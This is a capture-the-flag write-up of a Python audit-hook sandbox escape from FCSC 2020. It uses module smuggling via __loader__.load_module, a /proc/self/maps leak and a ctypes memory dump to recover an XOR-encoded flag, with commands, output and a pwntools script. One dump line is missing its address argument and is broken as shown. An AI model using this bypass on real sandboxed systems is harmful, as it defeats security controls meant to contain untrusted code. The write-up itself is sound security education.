# Why not a Sandbox?
### FCSC 2020 - pwn - medium

Source code is not provided in this challenge, but we can quickly tell that we are dealing with a python shell sandbox

```
Arriverez-vous à appeler la fonction print_flag ?
Python 3.8.2 (default, Apr  1 2020, 15:52:55)
[GCC 9.3.0] on linux
>>>
```

standard imports and allowed functoons are heavily restricted in this challenge using audit hooks:

```
>>> import os
Exception ignored in audit hook:
Exception: Action interdite
Exception: Module non autorisé
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
Exception: Action interdite
>>> import binascii
Exception ignored in audit hook:
Exception: Action interdite
Exception: Module non autorisé
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
Exception: Action interdite
>>>
```

audit events are broadcasted by the interpreter when a high impact command is about to be executed

audit hooks are custom functions that listen for audit events
and depending on what the author wants to do, raise exceptions

audit hooks are embedded in the CPython library that can intercept the commands before they are executed

after extensive research i found a way to bypass traditional imports and smuggle any library i wanted (ctypes was not blocked)

```
>>> _import = __loader__.load_module
>>> codecs = _import('codecs')
>>> binascii = _import('binascii')
>>> import ctypes
```

the codecs library of python has an open function which was apparently not blacklisted so we used it to read /proc/self/maps to leak the current process' binary names and address space

```
>>> print(codecs.open('/proc/self/maps', 'r').read())
555eb369d000-555eb369e000 r--p 00000000 00:3a 1335551                    /app/spython
555eb369e000-555eb369f000 r-xp 00001000 00:3a 1335551                    /app/spython
555eb369f000-555eb36a0000 r--p 00002000 00:3a 1335551                    /app/spython
555eb36a0000-555eb36a1000 r--p 00002000 00:3a 1335551                    /app/spython
555eb36a1000-555eb36a2000 rw-p 00003000 00:3a 1335551                    /app/spython
555ec6d1f000-555ec6de2000 rw-p 00000000 00:00 0                          [heap]
7f035084f000-7f035090f000 rw-p 00000000 00:00 0
7f035094f000-7f0350a8f000 rw-p 00000000 00:00 0
7f0350a8f000-7f0350a96000 r--s 00000000 00:3a 1336561                    /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
7f0350a96000-7f0350ac8000 r--p 00000000 00:3a 1335696                    /usr/lib/locale/C.UTF-8/LC_CTYPE
7f0350ac8000-7f0350aca000 rw-p 00000000 00:00 0
7f0350aca000-7f0350ad9000 r--p 00000000 00:3a 1335615                    /lib/x86_64-linux-gnu/libm-2.30.so
7f0350ad9000-7f0350b74000 r-xp 0000f000 00:3a 1335615                    /lib/x86_64-linux-gnu/libm-2.30.so
7f0350b74000-7f0350c0d000 r--p 000aa000 00:3a 1335615                    /lib/x86_64-linux-gnu/libm-2.30.so
7f0350c0d000-7f0350c0e000 r--p 00142000 00:3a 1335615                    /lib/x86_64-linux-gnu/libm-2.30.so
7f0350c0e000-7f0350c0f000 rw-p 00143000 00:3a 1335615                    /lib/x86_64-linux-gnu/libm-2.30.so
7f0350c0f000-7f0350c10000 r--p 00000000 00:3a 1335661                    /lib/x86_64-linux-gnu/libutil-2.30.so
7f0350c10000-7f0350c11000 r-xp 00001000 00:3a 1335661                    /lib/x86_64-linux-gnu/libutil-2.30.so
7f0350c11000-7f0350c12000 r--p 00002000 00:3a 1335661                    /lib/x86_64-linux-gnu/libutil-2.30.so
7f0350c12000-7f0350c13000 r--p 00002000 00:3a 1335661                    /lib/x86_64-linux-gnu/libutil-2.30.so
7f0350c13000-7f0350c14000 rw-p 00003000 00:3a 1335661                    /lib/x86_64-linux-gnu/libutil-2.30.so
7f0350c14000-7f0350c15000 r--p 00000000 00:3a 1335607                    /lib/x86_64-linux-gnu/libdl-2.30.so
7f0350c15000-7f0350c16000 r-xp 00001000 00:3a 1335607                    /lib/x86_64-linux-gnu/libdl-2.30.so
7f0350c16000-7f0350c17000 r--p 00002000 00:3a 1335607                    /lib/x86_64-linux-gnu/libdl-2.30.so
7f0350c17000-7f0350c18000 r--p 00002000 00:3a 1335607                    /lib/x86_64-linux-gnu/libdl-2.30.so
7f0350c18000-7f0350c19000 rw-p 00003000 00:3a 1335607                    /lib/x86_64-linux-gnu/libdl-2.30.so
7f0350c19000-7f0350c1b000 rw-p 00000000 00:00 0
7f0350c1b000-7f0350c22000 r--p 00000000 00:3a 1335646                    /lib/x86_64-linux-gnu/libpthread-2.30.so
7f0350c22000-7f0350c31000 r-xp 00007000 00:3a 1335646                    /lib/x86_64-linux-gnu/libpthread-2.30.so
7f0350c31000-7f0350c36000 r--p 00016000 00:3a 1335646                    /lib/x86_64-linux-gnu/libpthread-2.30.so
7f0350c36000-7f0350c37000 r--p 0001a000 00:3a 1335646                    /lib/x86_64-linux-gnu/libpthread-2.30.so
7f0350c37000-7f0350c38000 rw-p 0001b000 00:3a 1335646                    /lib/x86_64-linux-gnu/libpthread-2.30.so
7f0350c38000-7f0350c3c000 rw-p 00000000 00:00 0
7f0350c3c000-7f0350c55000 r-xp 00000000 00:3a 409046                     /lib/x86_64-linux-gnu/libz.so.1.2.8
7f0350c55000-7f0350e54000 ---p 00019000 00:3a 409046                     /lib/x86_64-linux-gnu/libz.so.1.2.8
7f0350e54000-7f0350e55000 r--p 00018000 00:3a 409046                     /lib/x86_64-linux-gnu/libz.so.1.2.8
7f0350e55000-7f0350e56000 rw-p 00019000 00:3a 409046                     /lib/x86_64-linux-gnu/libz.so.1.2.8
7f0350e56000-7f0350e5a000 r--p 00000000 00:3a 1335610                    /lib/x86_64-linux-gnu/libexpat.so.1.6.11
7f0350e5a000-7f0350e75000 r-xp 00004000 00:3a 1335610                    /lib/x86_64-linux-gnu/libexpat.so.1.6.11
7f0350e75000-7f0350e7f000 r--p 0001f000 00:3a 1335610                    /lib/x86_64-linux-gnu/libexpat.so.1.6.11
7f0350e7f000-7f0350e80000 ---p 00029000 00:3a 1335610                    /lib/x86_64-linux-gnu/libexpat.so.1.6.11
7f0350e80000-7f0350e82000 r--p 00029000 00:3a 1335610                    /lib/x86_64-linux-gnu/libexpat.so.1.6.11
7f0350e82000-7f0350e83000 rw-p 0002b000 00:3a 1335610                    /lib/x86_64-linux-gnu/libexpat.so.1.6.11
7f0350e83000-7f0350ea8000 r--p 00000000 00:3a 1335600                    /lib/x86_64-linux-gnu/libc-2.30.so
7f0350ea8000-7f0350ff2000 r-xp 00025000 00:3a 1335600                    /lib/x86_64-linux-gnu/libc-2.30.so
7f0350ff2000-7f035103c000 r--p 0016f000 00:3a 1335600                    /lib/x86_64-linux-gnu/libc-2.30.so
7f035103c000-7f035103f000 r--p 001b8000 00:3a 1335600                    /lib/x86_64-linux-gnu/libc-2.30.so
7f035103f000-7f0351042000 rw-p 001bb000 00:3a 1335600                    /lib/x86_64-linux-gnu/libc-2.30.so
7f0351042000-7f0351046000 rw-p 00000000 00:00 0
7f0351046000-7f0351047000 r--p 00000000 00:3a 1335548                    /app/lib_flag.so
7f0351047000-7f0351048000 r-xp 00001000 00:3a 1335548                    /app/lib_flag.so
7f0351048000-7f0351049000 r--p 00002000 00:3a 1335548                    /app/lib_flag.so
7f0351049000-7f035104a000 r--p 00002000 00:3a 1335548                    /app/lib_flag.so
7f035104a000-7f035104b000 rw-p 00003000 00:3a 1335548                    /app/lib_flag.so
7f035104b000-7f03510bc000 r--p 00000000 00:3a 1336584                    /usr/lib/x86_64-linux-gnu/libpython3.8.so.1.0
7f03510bc000-7f0351310000 r-xp 00071000 00:3a 1336584                    /usr/lib/x86_64-linux-gnu/libpython3.8.so.1.0
7f0351310000-7f0351529000 r--p 002c5000 00:3a 1336584                    /usr/lib/x86_64-linux-gnu/libpython3.8.so.1.0
7f0351529000-7f035152f000 r--p 004dd000 00:3a 1336584                    /usr/lib/x86_64-linux-gnu/libpython3.8.so.1.0
7f035152f000-7f0351576000 rw-p 004e3000 00:3a 1336584                    /usr/lib/x86_64-linux-gnu/libpython3.8.so.1.0
7f0351576000-7f035159b000 rw-p 00000000 00:00 0
7f035159d000-7f03515a1000 r--p 00000000 00:00 0                          [vvar]
7f03515a1000-7f03515a3000 r-xp 00000000 00:00 0                          [vdso]
7f03515a3000-7f03515a4000 r--p 00000000 00:3a 1335590                    /lib/x86_64-linux-gnu/ld-2.30.so
7f03515a4000-7f03515c2000 r-xp 00001000 00:3a 1335590                    /lib/x86_64-linux-gnu/ld-2.30.so
7f03515c2000-7f03515ca000 r--p 0001f000 00:3a 1335590                    /lib/x86_64-linux-gnu/ld-2.30.so
7f03515cb000-7f03515cc000 r--p 00027000 00:3a 1335590                    /lib/x86_64-linux-gnu/ld-2.30.so
7f03515cc000-7f03515cd000 rw-p 00028000 00:3a 1335590                    /lib/x86_64-linux-gnu/ld-2.30.so
7f03515cd000-7f03515ce000 rw-p 00000000 00:00 0
7ffdc55af000-7ffdc55d0000 rw-p 00000000 00:00 0                          [stack]

>>>
```

by looking at this we conclude that the main binary is called 'spython' and there is a custom dynamically linked library 'lib_flag.so'

```
libflag_dump = ctypes.string_at(, 40000)
binascii.hexlify(libflag_dump)
```

in that binary i find the print_flag function which includes the hard coded flag xored with 0x83, doing the same xor operation again reverses the initial xor giving us the flag:

```
__int64 print_flag()
{
  _QWORD v1[8]; // [rsp+0h] [rbp-50h] BYREF
  int v2; // [rsp+40h] [rbp-10h]
  __int16 v3; // [rsp+44h] [rbp-Ch]
  char v4; // [rsp+46h] [rbp-Ah]
  _BYTE *i; // [rsp+48h] [rbp-8h]

  v1[0] = 0xB5B6B6F8C0D0C0C5LL;
  v1[1] = 0xB3E6BAE0B6E6B3B5LL;
  v1[2] = 0xB2BABBBBBAE7BBB7LL;
  v1[3] = 0xE1E6B1B1BAB1E6B4LL;
  v1[4] = 0xE6B0B5B3B3B0B2B2LL;
  v1[5] = 0xE1E7B3B0B3B2E0E1LL;
  v1[6] = 0xE7E5B2BBE2B6B1B3LL;
  v1[7] = 0xE1B6B4E2E7E1B7B3LL;
  v2 = 0xE0B2E1E2;
  v3 = 0xFEB0;
  v4 = 0;
  for ( i = v1; *i; ++i )
    *i ^= 0x83u;
  return ((__int64 (*)(const char *, ...))sub_1040)("super flag: %s\n", (const char *)v1);
}
```
```
from pwn import *

flag_bytes = [
    0xB5B6B6F8C0D0C0C5, 0xB3E6BAE0B6E6B3B5, 0xB2BABBBBBAE7BBB7, 0xE1E6B1B1BAB1E6B4,
    0xE6B0B5B3B3B0B2B2, 0xE1E7B3B0B3B2E0E1, 0xE7E5B2BBE2B6B1B3, 0xE1B6B4E2E7E1B7B3 
]

raw_bytes = b''
for bytestr in flag_bytes:
    raw_bytes += p64(bytestr)

raw_bytes += p32(0xE0B2E1E2)
raw_bytes += p16(0xfeb0)

flag = xor(raw_bytes, 0x83)

print(flag.decode('utf-8'))
```
